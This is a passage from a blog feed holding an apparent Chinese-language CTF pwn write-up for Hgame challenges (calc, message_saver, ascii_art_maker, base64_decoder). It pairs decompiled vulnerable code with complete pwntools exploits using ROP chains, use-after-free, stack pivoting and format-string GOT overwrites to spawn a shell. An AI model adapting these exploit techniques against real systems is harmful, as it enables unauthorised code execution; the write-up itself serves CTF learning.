class="number">0x60</span>)</span><br><span class="line">delete(<span class="string">'C'</span>)  <span class="comment"># C</span></span><br><span class="line">delete(<span class="string">'B'</span>)  <span class="comment"># B-&gt;C</span></span><br><span class="line">delete(<span class="string">'A'</span>)  <span class="comment"># A==C-&gt;B-&gt;C</span></span><br><span class="line"></span><br><span class="line">offset1_argv = <span class="number">0x13b</span></span><br><span class="line">offset_env = <span class="number">0x13b</span>+<span class="number">16</span></span><br><span class="line">payload = p64(stack_addr-offset_env).ljust(<span class="number">0x60</span>,<span class="string">'\0'</span>) <span class="comment">#read_str stack</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,payload)  <span class="comment">#A</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,<span class="string">'F'</span>*<span class="number">0x60</span>) <span class="comment">#B</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,<span class="string">'F'</span>*<span class="number">0x60</span>) <span class="comment">#C</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0xb</span> + p64(pr) + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="string">'G'</span>,<span class="number">6</span>,payload.ljust(<span class="number">0x60</span>,<span class="string">'\0'</span>)) <span class="comment">#stack</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>这条题跟之前湖湘杯的一题很想，思路也是一样，程序静态编译，直接组ROPchain就好了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1[<span class="number">64</span>]; <span class="comment">// [esp+8h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+108h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to my calculator (alpha version)"</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( read_int_3() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v3 = add_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v3 = sub_804894E();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3 = mul_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v3 = div_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v1[v2] = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result %d save success!!\n"</span>, v1[v2++]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye."</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invaild choice."</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意会覆盖到v2的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">p= process(<span class="string">'./calc'</span>)</span><br><span class="line"></span><br><span class="line">rop=<span class="string">''</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop+= <span class="string">'/bin'</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop+= <span class="string">'//sh'</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080dee5d</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806d445</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_save</span><span class="params">(x)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'a:'</span>,<span class="string">'0'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'b:'</span>,str(x))</span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'5'</span>)</span><br><span class="line"><span class="comment">#padding</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">69</span>):</span><br><span class="line">  add_save(i)</span><br><span class="line"><span class="comment">#rop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rop)/<span class="number">4</span>):</span><br><span class="line">  add_save(u32(rop[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>]))</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'6'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="message-saver"><a href="#message-saver" class="headerlink" title="message_saver"></a>message_saver</h3><p>提示是UAF，程序message结构体如下：</p><table><thead><tr><th>content</th><th>size</th></tr></thead><tbody><tr><td>message size</td><td>8byte</td></tr><tr><td>message addr</td><td>8byte</td></tr><tr><td>encoder</td><td>8byte</td></tr></tbody></table><p>思路是：增加一条message，然后删掉（但指针没清空），此时仍然可以编辑，编辑一个0x18大小的message，encoder修改为程序留的后门（如果没有就泄露libc地址），然后show的时候就会执行encoder位置的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./message_saver'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(len, con, encoder=<span class="number">1</span>)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,str(len))</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,con)</span><br><span class="line">  p.sendlineafter(<span class="string">'===========\n'</span>,str(encoder))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(len, con)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,str(len))</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="number">1</span>)</span><br><span class="line">delete()</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(<span class="number">0x400816</span>)</span><br><span class="line">edit(<span class="number">0x18</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ascii-art-maker"><a href="#ascii-art-maker" class="headerlink" title="ascii_art_maker"></a>ascii_art_maker</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  sub_4006D6();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input the string you want to convert:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x90</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( buf )</span><br><span class="line">    sub_400705(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure><p>main函数中存在一个0x10比特的栈溢出，可以覆盖rbp和ret，不够组rop，本题需要用<strong>栈迁移</strong>(<code>stack migrate</code>)</p><p>利用步骤:</p><ol><li>伪造rbp为bss地址，然后跳回<code>read(0, &amp;buf, 0x90uLL);</code>处扩大输入，可以发现会写入bss-0x80处。</li><li>第一段rop是泄露puts地址计算libc基址，写入第二段rop到bss+0x100，最后迁移stack到这里进行getshell。填充满0x80后溢出覆盖伪造rbp为bss-0x80，迁移stack到这里执行第一段rop。</li><li>构造第二段rop写到bss+0x100，然后迁移stack到bss+0x100执行rop。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span> )</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x0400A2B')</span></span><br><span class="line">p.recvuntil(<span class="string">'convert:\n'</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x400a93</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">prsi = <span class="number">0x400a91</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">prbp = <span class="number">0x400640</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line">leave = <span class="number">0x400a2b</span></span><br><span class="line">read_addr = <span class="number">0x4009fc</span></span><br><span class="line">bss = <span class="number">0x602c00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + p64(bss) + p64(read_addr) <span class="comment"># write rop1 to bss-0x80</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0xdeadbeef</span>) + p64(prdi) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'puts'</span>]) <span class="comment"># leak puts</span></span><br><span class="line">rop += p64(prsi) + p64(bss+<span class="number">0x100</span>) + p64(bss+<span class="number">0x100</span>)+ p64(prdi) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">'read'</span>]) <span class="comment"># write rop2 to bss+0x100</span></span><br><span class="line">rop += p64(prbp) + p64(bss+<span class="number">0x100</span>) + p64(leave) <span class="comment">#ret to bss+0x100</span></span><br><span class="line">rop = rop.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>) + p64(bss<span class="number">-0x80</span>) + p64(leave) <span class="comment">#ret to bss-0x80</span></span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">addr_leak = p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]</span><br><span class="line">puts_addr = u64(addr_leak.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] puts : '</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system: '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p64(<span class="number">0x602c00</span>)+ p64(prdi) +p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h3 id="base64-decoder"><a href="#base64-decoder" class="headerlink" title="base64_decoder"></a>base64_decoder</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+8h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = <span class="number">2</span>;</span><br><span class="line">  sub_80485FB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===== online base64 decoder ====="</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(aBuyIt);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is the trial version, \x1B[0;31m%d\x1B[0m times left.\n"</span>, v1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%255s"</span>, &amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"exit"</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( read_str(&amp;s1) )</span><br><span class="line">    &#123;</span><br><span class="line">      base64decode(&amp;s1);</span><br><span class="line">      <span class="built_in">printf</span>(&amp;s1);</span><br><span class="line">      --v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个很显示的格式化字符串漏洞，程序只能printf两次，可以泄露stack地址，修改v1然后用DynELF，或者泄露函数地址，网上找libc。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0xffe6ade0 --&gt; 0xffe6adfc (&quot;AAAA%p%p%p%p%p%p%p%p%p%p&quot;)</span><br><span class="line">0004| 0xffe6ade4 --&gt; 0x8048ad3 (&quot;exit&quot;)</span><br><span class="line">0008| 0xffe6ade8 --&gt; 0xffe6af08 --&gt; 0x0 </span><br><span class="line">0012| 0xffe6adec --&gt; 0x8048888 (sub    esp,0xc)</span><br><span class="line">0016| 0xffe6adf0 --&gt; 0xf7eff000 --&gt; 0x23f3c </span><br><span class="line">0020| 0xffe6adf4 --&gt; 0x8048320 (&quot;__libc_start_main&quot;)</span><br><span class="line">0024| 0xffe6adf8 --&gt; 0x2 </span><br><span class="line">0028| 0xffe6adfc (&quot;AAAA%p%p%p%p%p%p%p%p%p%p&quot;)</span><br><span class="line">gdb-peda$ distance 0xffe6af08 0xffe6adf8</span><br><span class="line">From 0xffe6af08 to 0xffe6adf8: -272 bytes, -68 dwords</span><br></pre></td></tr></table></figure></p><p>按照官方提示用DynELF做，脚本如下：（注意覆盖v1的时候不要溢出了）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak stack</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(<span class="string">'AAAA%2$pBBBB'</span>))</span><br><span class="line">p.recvuntil(<span class="string">'AAAA'</span>)</span><br><span class="line">stack_addr = int(p.recvuntil(<span class="string">'BBBB'</span>)[:<span class="number">-4</span>],<span class="number">16</span>)</span><br><span class="line">success(<span class="string">'stack_addr:%x'</span>,stack_addr)</span><br><span class="line"><span class="comment">#overwrite v1</span></span><br><span class="line">payload = p32(stack_addr<span class="number">-0x110</span>)+<span class="string">'%250c%7$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">  payload = <span class="string">'AAAA%10$sBBB'</span> + p32(addr)</span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line">  p.recvuntil(<span class="string">'AAAA'</span>)</span><br><span class="line">  info = p.recvuntil(<span class="string">'BBB'</span>)[:<span class="number">-3</span>]</span><br><span class="line">  <span class="keyword">if</span> info == <span class="string">''</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x00'</span></span><br><span class="line">  <span class="keyword">return</span> info</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">d = DynELF(leak,elf=elf,libcdb=<span class="keyword">False</span>)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">success(<span class="string">'system_addr:%x'</span>,system_addr)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;elf.got[<span class="string">'printf'</span>]:system_addr&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line">p.sendline(b64encode(<span class="string">'/bin/sh\0'</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;终于补完了Hgame的pwn，学到很多新姿势。&lt;/p&gt;
&lt;h3 id=&quot;guess-number&quot;&gt;&lt;a href=&quot;#guess-number&quot; class=&quot;headerlink&quot; title=&quot;guess_number&quot;&gt;&lt;/a&gt;guess_number&lt;/h3&gt;&lt;f
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HITCTF2018-writeup</title>
    <link href="https://4f-kira.github.io/2018/02/05/HITCTF2018-writeup/"/>
    <id>https://4f-kira.github.io/2018/02/05/HITCTF2018-writeup/</id>
    <published>2018-02-05T01:12:04.000Z</published>
    <updated>2018-04-12T08:37:46.011Z</updated>
    
